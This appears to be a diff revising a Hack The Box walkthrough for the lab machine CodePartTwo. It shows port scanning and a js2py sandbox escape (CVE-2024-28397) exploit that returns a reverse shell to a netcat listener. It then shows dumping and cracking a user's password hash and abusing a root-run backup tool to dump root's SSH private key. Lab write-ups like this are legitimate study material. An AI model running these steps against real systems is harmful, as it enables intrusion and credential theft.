@@ -6,38 +6,32 @@ title: HTB - CodePartTwo
 ---
 ## How many open TCP ports are listening on CodePartTwo?
 
-The initial scan was performed using RustScan and Nmap to identify active services:
+The initial enumeration phase involves scanning the target to identify active services:
 
-JavaScript
-
-```
+```js
 ┌──(kali㉿kali)-[~/Desktop/htb]
 └─$ rustscan -a 10.129.232.59 --ulimit 5000
-.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
-| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
-| .-. \| {_} |.-._} } | |  .-._} }\      }/  /\  \| |\  |
-`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
-The Modern Day Port Scanner.
-
+...
 Open 10.129.232.59:22
 Open 10.129.232.59:8000
 
 PORT     STATE SERVICE  REASON
 22/tcp   open  ssh      syn-ack ttl 63
 8000/tcp open  http-alt syn-ack ttl 63
-```
 
-**Answer:** 2
+Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
+```
 
 ---
 
 ## What is the version of the js2py library being used by the application?
 
-The application source code was downloaded and the dependencies were inspected in `requirements.txt`:
+- Open website with port 8000
+- Download app via "DOWNLOAD APP" button
+- Inspect dependencies in `requirements.txt` to identify the specific library version:
+    
 
-JavaScript
-
-```
+```js
 ┌──(kali㉿kali)-[~/Desktop/htb]
 └─$ unzip app.zip
 ...
@@ -48,40 +42,71 @@ flask-sqlalchemy==3.1.1
 js2py==0.74
 ```
 
-**Answer:** 0.74
-
 ---
 
 ## Which CVE number corresponds to the sandbox escape vulnerability in js2py that the application uses?
 
-Searching for js2py 0.74 vulnerabilities reveals a critical sandbox escape flaw: **Answer:** CVE-2024-28397
+A search for sandbox escape vulnerabilities in `js2py 0.74` points to a specific security advisory:
+
+`https://github.com/naclapor/CVE-2024-28397`
 
 ---
 
 ## What is the name of the database used by the application?
 
-The environment was set up to execute the exploit and gain a reverse shell:
+### Setup Exploit
+
+Clone the exploit repository and initialize the Python environment using `uv` to manage dependencies:
+
+```js
+┌──(kali㉿kali)-[~/Desktop]
+└─$ git clone https://github.com/naclapor/CVE-2024-28397.git && cd CVE-2024-28397
+...
+┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
+└─$ uv init
+┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
+└─$ uv venv
+┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
+└─$ uv pip install requests
+```
+
+### Netcat Listener
+
+Prepare a listener to intercept the reverse shell connection:
+
+```js
+┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
+└─$ nc -lnvp 4444
+```
+
+### Exploit Execution
+
+Run the exploit targeting the vulnerable `/run_code` endpoint to trigger Remote Code Execution (RCE):
 
 ```js
 ┌──(kali㉿kali)-[~/Desktop/CVE-2024-28397]
 └─$ uv run python exploit.py --target http://10.129.232.59:8000/run_code --lhost 10.10.14.236 --lport 4444
-[*] Sending exploit payload...
+...
 [+] Payload sent successfully!
+[+] Response: {"error":"'NoneType' object is not callable"}
+```
 
-# On the netcat listener:
+### Reverse Shell Access
+
+After the payload executes, upgrade the shell to a full TTY and locate the application's database file:
+
+```js
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 app@codeparttwo:~/app$ ls instance
 users.db
 ```
 
-**Answer:** users.db
-
 ---
 
 ## What is the recovered password for the user marco?
 
-The database was inspected to extract the password hashes:
+Extract the user password hashes directly from the SQLite database file:
 
 ```js
 app@codeparttwo:~/app$ cat instance/users.db
@@ -89,19 +114,18 @@ app@codeparttwo:~/app$ cat instance/users.db
 Mmarco649c9d65a206a75f5abe509fe128bce5
 ```
 
-The hash `649c9d65a206a75f5abe509fe128bce5` was cracked using CrackStation. **Answer:** [Recovered plaintext password]
+The recovered MD5 hash `649c9d65a206a75f5abe509fe128bce5` for user `marco` can be cracked using online rainbow tables like CrackStation.
 
 ---
 
 ## Submit the flag located in the marco user's home directory.
 
-Logged in via SSH using the recovered credentials:
+Establish an SSH session using the cracked credentials for user `marco`:
 
 ```js
 ┌──(kali㉿kali)-[~]
 └─$ ssh marco@10.129.232.59
-marco@10.129.232.59's password: 
-
+marco@10.129.232.59's password:
 marco@codeparttwo:~$ cat user.txt
 ```
 
@@ -109,25 +133,22 @@ marco@codeparttwo:~$ cat user.txt
 
 ## What is the full path to the backup utility that the marco user can run as root without a password?
 
-Checked sudo permissions:
+Check the sudo configurations to identify potential privilege escalation vectors:
 
 ```js
 marco@codeparttwo:~$ sudo -l
+...
 User marco may run the following commands on codeparttwo:
     (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
 ```
-
-**Answer:** /usr/local/bin/npbackup-cli
 
 ---
 
 ## What is the full backup path defined in the npbackup configuration file found in marco’s home directory?
 
-Inspected the configuration file `npbackup.conf`:
+Examine the contents of the `npbackup.conf` file to understand the backup routine:
 
-JavaScript
-
-```
+```js
 marco@codeparttwo:~$ cat npbackup.conf
 ...
     backup_opts:
@@ -135,30 +156,48 @@ marco@codeparttwo:~$ cat npbackup.conf
       - /home/app/app/
 ```
 
-**Answer:** /home/app/app/
-
 ---
 
 ## Submit the flag located in the root user's home directory.
 
-Modified the configuration to point to `/root` and performed a backup to dump the root SSH key:
+### Modify Configuration
 
-JavaScript
+Abuse the backup utility by creating a custom configuration file that targets the `/root` directory:
 
+```js
+marco@codeparttwo:~$ cp npbackup.conf npbackup1.conf
+marco@codeparttwo:~$ vi npbackup1.conf
+# Change target path from /home/app/app/ to /root
 ```
-# Modify path to /root in npbackup1.conf
+
+### Run Backup with Root Privileges
+
+Execute the backup utility using the modified configuration:
+
+```js
 marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf -b -f
+...
+2026-02-08 12:20:28,486 :: INFO :: Running backup of ['/root'] to repo default
+snapshot b6138687 saved
+```
+
+### Extract Root SSH Credentials
+
+Since the utility is running as root, it can backup and dump sensitive files like the root SSH private key:
+
+
+```js
 marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackup1.conf --dump /root/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
 ...
 -----END OPENSSH PRIVATE KEY-----
 ```
 
-Final access was gained by using the dumped RSA key to SSH as root:
+### Final Root Access
 
-JavaScript
+Save the dumped key to your local machine, adjust the file permissions, and log in as the root user:
 
-```
+```js
 ┌──(kali㉿kali)-[~/Desktop/htb]
 └─$ chmod 600 id_rsa
 ┌──(kali㉿kali)-[~/Desktop/htb]
